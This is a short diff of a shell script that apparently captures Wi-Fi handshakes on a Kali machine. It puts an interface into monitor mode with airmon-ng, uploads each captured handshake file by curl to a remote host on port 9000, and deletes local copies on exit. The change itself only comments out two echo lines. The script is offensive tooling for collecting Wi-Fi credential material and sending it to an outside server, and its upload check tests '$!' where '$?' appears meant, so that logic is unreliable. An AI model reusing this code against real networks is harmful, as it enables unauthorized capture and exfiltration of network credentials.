@@ -16,8 +16,8 @@ checkUtils() {
 }
 
 sendHandshake() {
-  echo $1
-  echo $2
+ # echo $1
+ # echo $2
   curl -i -X POST -H "Content-Type: multipart/form-data" -F "file=@$1" http://$2:9000/upload
   if [[ $! == 0 ]]; then
     rm $1
@@ -93,7 +93,6 @@ active() {
 
 passive() {
   trap 'checkHandshakes;rm /home/kali/shakes-*' EXIT
-
   #airmon-ng check kill
   airmon-ng start wlan1
   echo $1
